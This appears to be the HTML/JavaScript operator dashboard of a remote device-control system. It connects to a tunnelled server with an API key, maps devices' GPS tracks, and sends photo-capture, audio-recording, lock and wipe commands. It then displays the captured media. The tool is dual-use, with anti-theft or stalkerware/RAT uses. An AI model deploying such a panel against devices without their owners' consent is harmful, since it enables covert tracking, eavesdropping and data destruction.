<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Magneetar — Command Center</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css"/>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --bg:       #080c10;
    --panel:    #0d1318;
    --border:   #1a2a1a;
    --accent:   #00ff88;
    --accent2:  #00c8ff;
    --danger:   #ff3355;
    --warn:     #ffaa00;
    --text:     #c8d8c8;
    --dim:      #4a6a4a;
    --glow:     0 0 12px #00ff8844;
    --glow2:    0 0 12px #00c8ff44;
  }

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'Rajdhani', sans-serif;
    background: var(--bg);
    color: var(--text);
    height: 100vh;
    display: grid;
    grid-template-rows: 48px 1fr;
    grid-template-columns: 280px 1fr 300px;
    grid-template-areas:
      "header header header"
      "sidebar map panel";
    overflow: hidden;
  }

  /* ── Header ── */
  header {
    grid-area: header;
    background: var(--panel);
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    padding: 0 16px;
    gap: 16px;
  }
  .logo {
    font-family: 'Share Tech Mono', monospace;
    font-size: 15px;
    color: var(--accent);
    letter-spacing: 3px;
    text-shadow: var(--glow);
  }
  .logo span { color: var(--dim); }
  .status-dot {
    width: 8px; height: 8px;
    border-radius: 50%;
    background: var(--accent);
    box-shadow: var(--glow);
    animation: pulse 2s infinite;
  }
  @keyframes pulse {
    0%,100% { opacity: 1; }
    50%      { opacity: 0.3; }
  }
  .header-status { font-size: 12px; color: var(--dim); font-family: 'Share Tech Mono', monospace; }
  .header-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
  #serverInput {
    background: #111;
    border: 1px solid var(--border);
    color: var(--text);
    padding: 4px 10px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    border-radius: 3px;
    width: 220px;
  }
  #apiKeyInput {
    background: #111;
    border: 1px solid var(--border);
    color: var(--text);
    padding: 4px 10px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    border-radius: 3px;
    width: 140px;
  }
  .btn {
    font-family: 'Rajdhani', sans-serif;
    font-weight: 600;
    font-size: 12px;
    letter-spacing: 1px;
    padding: 5px 14px;
    border: 1px solid var(--accent);
    background: transparent;
    color: var(--accent);
    cursor: pointer;
    border-radius: 3px;
    transition: all .15s;
    text-transform: uppercase;
  }
  .btn:hover { background: var(--accent); color: var(--bg); box-shadow: var(--glow); }
  .btn.danger { border-color: var(--danger); color: var(--danger); }
  .btn.danger:hover { background: var(--danger); color: #fff; box-shadow: 0 0 12px #ff335544; }
  .btn.warn { border-color: var(--warn); color: var(--warn); }
  .btn.warn:hover { background: var(--warn); color: var(--bg); }
  .btn.blue { border-color: var(--accent2); color: var(--accent2); }
  .btn.blue:hover { background: var(--accent2); color: var(--bg); box-shadow: var(--glow2); }
  .btn:disabled { opacity: 0.3; cursor: not-allowed; }

  /* ── Sidebar ── */
  #sidebar {
    grid-area: sidebar;
    background: var(--panel);
    border-right: 1px solid var(--border);
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }
  .section-title {
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    letter-spacing: 2px;
    color: var(--dim);
    padding: 10px 14px 6px;
    border-bottom: 1px solid var(--border);
    text-transform: uppercase;
  }
  #deviceList { flex: 1; overflow-y: auto; }
  .device-item {
    padding: 12px 14px;
    border-bottom: 1px solid var(--border);
    cursor: pointer;
    transition: background .1s;
  }
  .device-item:hover, .device-item.active { background: #111c11; }
  .device-item.active { border-left: 3px solid var(--accent); }
  .device-name { font-weight: 600; font-size: 14px; color: var(--accent); }
  .device-id   { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--dim); margin-top: 2px; }
  .device-last { font-size: 11px; color: var(--dim); margin-top: 4px; }
  .device-badge {
    display: inline-block;
    padding: 1px 6px;
    border-radius: 2px;
    font-size: 10px;
    font-weight: 700;
    margin-top: 4px;
  }
  .badge-online  { background: #001a0a; color: var(--accent); border: 1px solid var(--accent); }
  .badge-offline { background: #1a0a00; color: var(--warn);   border: 1px solid var(--warn); }

  /* ── Map ── */
  #map {
    grid-area: map;
    background: #050a08;
  }

  /* ── Right Panel ── */
  #panel {
    grid-area: panel;
    background: var(--panel);
    border-left: 1px solid var(--border);
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }
  .tab-bar {
    display: flex;
    border-bottom: 1px solid var(--border);
  }
  .tab {
    flex: 1;
    padding: 10px 0;
    text-align: center;
    font-size: 11px;
    letter-spacing: 1px;
    text-transform: uppercase;
    cursor: pointer;
    color: var(--dim);
    transition: color .15s;
    font-weight: 600;
  }
  .tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
  .tab-content { flex: 1; overflow-y: auto; padding: 12px; display: none; }
  .tab-content.active { display: block; }

  /* Commands */
  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 16px; }
  .cmd-log { background: #060e06; border: 1px solid var(--border); border-radius: 4px; padding: 10px; }
  .cmd-log-title { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--dim); margin-bottom: 8px; letter-spacing: 1px; }
  .log-item { font-family: 'Share Tech Mono', monospace; font-size: 10px; padding: 4px 0; border-bottom: 1px solid #0d1a0d; }
  .log-item .cmd-name { color: var(--accent2); }
  .log-item .cmd-status-ok   { color: var(--accent); }
  .log-item .cmd-status-pend { color: var(--warn); }
  .log-item .cmd-time { color: var(--dim); float: right; }

  /* Media */
  .media-grid { display: grid; grid-template-columns: 1fr; gap: 8px; }
  .media-item {
    background: #060e06;
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 10px;
    cursor: pointer;
    transition: border-color .15s;
  }
  .media-item:hover { border-color: var(--accent2); }
  .media-type { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--accent2); }
  .media-time { font-size: 11px; color: var(--dim); margin-top: 2px; }
  .media-preview { margin-top: 8px; }
  .media-preview img { width: 100%; border-radius: 3px; }

  /* Location info */
  .loc-card { background: #060e06; border: 1px solid var(--border); border-radius: 4px; padding: 12px; margin-bottom: 10px; }
  .loc-label { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--dim); margin-bottom: 4px; }
  .loc-value { font-size: 14px; font-weight: 600; color: var(--text); }
  .loc-value.accent { color: var(--accent); }

  /* Modal */
  #modal {
    display: none;
    position: fixed; inset: 0;
    background: #000000cc;
    z-index: 9999;
    align-items: center;
    justify-content: center;
  }
  #modal.open { display: flex; }
  #modalBox {
    background: var(--panel);
    border: 1px solid var(--accent);
    border-radius: 6px;
    padding: 20px;
    max-width: 500px;
    width: 90%;
    box-shadow: var(--glow);
  }
  #modalTitle { font-size: 16px; font-weight: 700; color: var(--accent); margin-bottom: 12px; }
  #modalContent { font-size: 13px; line-height: 1.6; }
  #modalContent img { max-width: 100%; border-radius: 4px; margin-top: 10px; }
  #modalClose { margin-top: 16px; }

  /* Scrollbars */
  ::-webkit-scrollbar { width: 4px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }

  .empty-state { color: var(--dim); font-size: 12px; text-align: center; padding: 30px 10px; font-family: 'Share Tech Mono', monospace; }
</style>
</head>
<body>

<!-- Header -->
<header>
  <div class="logo">MAGNEE<span>TAR</span></div>
  <div class="status-dot" id="statusDot"></div>
  <div class="header-status" id="headerStatus">CONNECTING...</div>
  <div class="header-right">
    <input id="serverInput"  type="text" placeholder="Server URL (e.g. https://xyz.trycloudflare.com)" />
    <input id="apiKeyInput"  type="password" placeholder="API Key" />
    <button class="btn" onclick="connect()">CONNECT</button>
  </div>
</header>

<!-- Sidebar: device list -->
<aside id="sidebar">
  <div class="section-title">● REGISTERED DEVICES</div>
  <div id="deviceList"><div class="empty-state">No devices yet.<br>Connect to server first.</div></div>
</aside>

<!-- Map -->
<div id="map"></div>

<!-- Right panel -->
<div id="panel">
  <div class="tab-bar">
    <div class="tab active" onclick="switchTab('commands')">COMMANDS</div>
    <div class="tab"        onclick="switchTab('location')">LOCATION</div>
    <div class="tab"        onclick="switchTab('media')">MEDIA</div>
  </div>

  <!-- Commands tab -->
  <div class="tab-content active" id="tab-commands">
    <div id="noDeviceMsg" class="empty-state">Select a device<br>to issue commands.</div>
    <div id="cmdControls" style="display:none">
      <div class="cmd-grid">
        <button class="btn blue"   onclick="sendCmd('ping')">PING</button>
        <button class="btn blue"   onclick="sendCmd('capture_photo')">📷 PHOTO</button>
        <button class="btn blue"   onclick="sendCmd('capture_audio')">🎙 AUDIO</button>
        <button class="btn warn"   onclick="sendCmd('lock')">🔒 LOCK</button>
        <button class="btn danger" onclick="confirmWipe()">⚠ WIPE</button>
      </div>
      <div class="cmd-log">
        <div class="cmd-log-title">COMMAND LOG</div>
        <div id="cmdLog"></div>
      </div>
    </div>
  </div>

  <!-- Location tab -->
  <div class="tab-content" id="tab-location">
    <div id="locInfo" class="empty-state">Select a device.</div>
  </div>

  <!-- Media tab -->
  <div class="tab-content" id="tab-media">
    <div id="mediaList" class="empty-state">Select a device.</div>
  </div>
</div>

<!-- Modal -->
<div id="modal">
  <div id="modalBox">
    <div id="modalTitle"></div>
    <div id="modalContent"></div>
    <button class="btn" id="modalClose" onclick="closeModal()">CLOSE</button>
  </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
<script>
// ─── State ────────────────────────────────────────────────────────────────────
let SERVER = '';
let API_KEY = '';
let selectedDevice = null;
let devices = [];
let refreshTimer = null;
let map, trackLayer, markerLayer;

// ─── Map init ─────────────────────────────────────────────────────────────────
map = L.map('map', { zoomControl: true }).setView([9.0820, 8.6753], 6);
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
  attribution: '© OpenStreetMap © CARTO',
  maxZoom: 19
}).addTo(map);
trackLayer  = L.layerGroup().addTo(map);
markerLayer = L.layerGroup().addTo(map);

// ─── Helpers ─────────────────────────────────────────────────────────────────
const api = async (path, method = 'GET', body = null) => {
  const opts = {
    method,
    headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY }
  };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(SERVER + path, opts);
  if (!res.ok) throw new Error(`${res.status} ${res.statusText}`);
  return res.json();
};

const relTime = ts => {
  if (!ts) return 'never';
  const diff = (Date.now() - new Date(ts)) / 1000;
  if (diff < 60)   return `${Math.round(diff)}s ago`;
  if (diff < 3600) return `${Math.round(diff/60)}m ago`;
  return `${Math.round(diff/3600)}h ago`;
};

const isOnline = ts => ts && (Date.now() - new Date(ts)) < 30000;

// ─── Connect ──────────────────────────────────────────────────────────────────
async function connect() {
  SERVER  = document.getElementById('serverInput').value.trim().replace(/\/$/, '');
  API_KEY = document.getElementById('apiKeyInput').value.trim();
  if (!SERVER || !API_KEY) return alert('Enter server URL and API key.');
  try {
    await api('/health');
    document.getElementById('headerStatus').textContent = 'ONLINE — ' + SERVER;
    document.getElementById('statusDot').style.background = 'var(--accent)';
    if (refreshTimer) clearInterval(refreshTimer);
    refreshTimer = setInterval(refresh, 5000);
    refresh();
  } catch(e) {
    document.getElementById('headerStatus').textContent = 'CONNECTION FAILED';
    document.getElementById('statusDot').style.background = 'var(--danger)';
  }
}

// ─── Refresh loop ─────────────────────────────────────────────────────────────
async function refresh() {
  try {
    const data = await api('/api/dashboard/devices');
    devices = data.devices || [];
    renderDeviceList();
    if (selectedDevice) {
      refreshLocations();
      refreshMedia();
      refreshCommands();
    }
  } catch(e) { console.warn('Refresh error:', e); }
}

function renderDeviceList() {
  const el = document.getElementById('deviceList');
  if (!devices.length) {
    el.innerHTML = '<div class="empty-state">No devices registered yet.</div>';
    return;
  }
  el.innerHTML = devices.map(d => `
    <div class="device-item ${selectedDevice === d.id ? 'active' : ''}" onclick="selectDevice('${d.id}')">
      <div class="device-name">${d.alias || 'Device'}</div>
      <div class="device-id">${d.id}</div>
      <div class="device-last">Last seen: ${relTime(d.last_seen)}</div>
      <span class="device-badge ${isOnline(d.last_seen) ? 'badge-online' : 'badge-offline'}">
        ${isOnline(d.last_seen) ? '● ONLINE' : '○ OFFLINE'}
      </span>
    </div>
  `).join('');
}

// ─── Device select ────────────────────────────────────────────────────────────
function selectDevice(id) {
  selectedDevice = id;
  renderDeviceList();
  document.getElementById('noDeviceMsg').style.display  = 'none';
  document.getElementById('cmdControls').style.display  = 'block';
  refreshLocations();
  refreshMedia();
  refreshCommands();
}

// ─── Locations ────────────────────────────────────────────────────────────────
async function refreshLocations() {
  try {
    const data = await api(`/api/dashboard/locations/${selectedDevice}?limit=100`);
    const locs = data.locations || [];
    renderTrack(locs);
    renderLocationInfo(locs[0]);
  } catch(e) {}
}

function renderTrack(locs) {
  trackLayer.clearLayers();
  markerLayer.clearLayers();
  if (!locs.length) return;

  const points = locs.map(l => [l.lat, l.lng]).reverse();
  L.polyline(points, { color: '#00ff88', weight: 2, opacity: 0.5 }).addTo(trackLayer);

  // Latest marker
  const latest = locs[0];
  const icon = L.divIcon({
    html: `<div style="width:14px;height:14px;border-radius:50%;background:#00ff88;border:2px solid #fff;box-shadow:0 0 10px #00ff88;"></div>`,
    className: '', iconSize: [14,14], iconAnchor: [7,7]
  });
  L.marker([latest.lat, latest.lng], {icon})
    .bindPopup(`<b>Last location</b><br>${latest.lat.toFixed(6)}, ${latest.lng.toFixed(6)}<br>${latest.timestamp}`)
    .addTo(markerLayer);
  map.setView([latest.lat, latest.lng], 15);
}

function renderLocationInfo(loc) {
  const el = document.getElementById('locInfo');
  if (!loc) { el.innerHTML = '<div class="empty-state">No location data.</div>'; return; }
  el.innerHTML = `
    <div class="loc-card">
      <div class="loc-label">LATITUDE</div>
      <div class="loc-value accent">${loc.lat.toFixed(6)}°</div>
    </div>
    <div class="loc-card">
      <div class="loc-label">LONGITUDE</div>
      <div class="loc-value accent">${loc.lng.toFixed(6)}°</div>
    </div>
    <div class="loc-card">
      <div class="loc-label">ACCURACY</div>
      <div class="loc-value">${loc.accuracy ? loc.accuracy.toFixed(1) + 'm' : 'unknown'}</div>
    </div>
    <div class="loc-card">
      <div class="loc-label">PROVIDER</div>
      <div class="loc-value">${loc.provider || 'gps'}</div>
    </div>
    <div class="loc-card">
      <div class="loc-label">TIMESTAMP</div>
      <div class="loc-value">${loc.timestamp}</div>
    </div>
  `;
}

// ─── Commands ─────────────────────────────────────────────────────────────────
async function sendCmd(command) {
  if (!selectedDevice) return;
  try {
    await api('/api/dashboard/command', 'POST', { device_id: selectedDevice, command });
    refreshCommands();
  } catch(e) { alert('Failed to queue command: ' + e.message); }
}

function confirmWipe() {
  if (!confirm('⚠️ REMOTE WIPE will erase all data on the device.\n\nAre you absolutely sure?')) return;
  sendCmd('wipe');
}

async function refreshCommands() {
  try {
    const data = await api(`/api/dashboard/commands/${selectedDevice}`);
    const cmds = data.commands || [];
    const el = document.getElementById('cmdLog');
    if (!cmds.length) { el.innerHTML = '<div style="color:var(--dim);font-size:11px;padding:4px 0;">No commands yet.</div>'; return; }
    el.innerHTML = cmds.slice(0, 20).map(c => `
      <div class="log-item">
        <span class="cmd-name">${c.command.toUpperCase()}</span>
        <span class="cmd-time">${relTime(c.issued_at)}</span><br>
        <span class="${c.status === 'executed' ? 'cmd-status-ok' : 'cmd-status-pend'}">
          ${c.status === 'executed' ? '✓ EXECUTED' : '⏳ PENDING'}
        </span>
      </div>
    `).join('');
  } catch(e) {}
}

// ─── Media ────────────────────────────────────────────────────────────────────
async function refreshMedia() {
  try {
    const data = await api(`/api/dashboard/media/${selectedDevice}`);
    const media = data.media || [];
    const el = document.getElementById('mediaList');
    if (!media.length) { el.innerHTML = '<div class="empty-state">No media captured yet.<br>Send a photo/audio command.</div>'; return; }
    el.innerHTML = '<div class="media-grid">' + media.map(m => `
      <div class="media-item" onclick="openMedia(${m.id}, '${m.type}', '${m.timestamp}')">
        <div class="media-type">${m.type === 'photo' ? '📷 PHOTO' : '🎙 AUDIO'}</div>
        <div class="media-time">${m.timestamp}</div>
      </div>
    `).join('') + '</div>';
  } catch(e) {}
}

async function openMedia(id, type, ts) {
  try {
    const data = await api(`/api/dashboard/media/file/${id}`);
    document.getElementById('modalTitle').textContent = type === 'photo' ? '📷 CAPTURED PHOTO' : '🎙 AUDIO RECORDING';
    if (type === 'photo') {
      document.getElementById('modalContent').innerHTML = `
        <div style="color:var(--dim);font-size:11px;margin-bottom:8px;">${ts}</div>
        <img src="data:image/jpeg;base64,${data.data_b64}" alt="Captured photo"/>
      `;
    } else {
      document.getElementById('modalContent').innerHTML = `
        <div style="color:var(--dim);font-size:11px;margin-bottom:8px;">${ts}</div>
        <audio controls style="width:100%;margin-top:10px;">
          <source src="data:audio/aac;base64,${data.data_b64}" type="audio/aac">
          <source src="data:audio/mp4;base64,${data.data_b64}" type="audio/mp4">
        </audio>
      `;
    }
    document.getElementById('modal').classList.add('open');
  } catch(e) { alert('Failed to load media.'); }
}

function closeModal() {
  document.getElementById('modal').classList.remove('open');
  document.getElementById('modalContent').innerHTML = '';
}

// ─── Tabs ─────────────────────────────────────────────────────────────────────
function switchTab(name) {
  document.querySelectorAll('.tab').forEach((t,i) => {
    const tabs = ['commands','location','media'];
    t.classList.toggle('active', tabs[i] === name);
  });
  document.querySelectorAll('.tab-content').forEach(c => {
    c.classList.toggle('active', c.id === 'tab-' + name);
  });
}

// Close modal on backdrop click
document.getElementById('modal').addEventListener('click', e => {
  if (e.target === document.getElementById('modal')) closeModal();
});
</script>
</body>
</html>
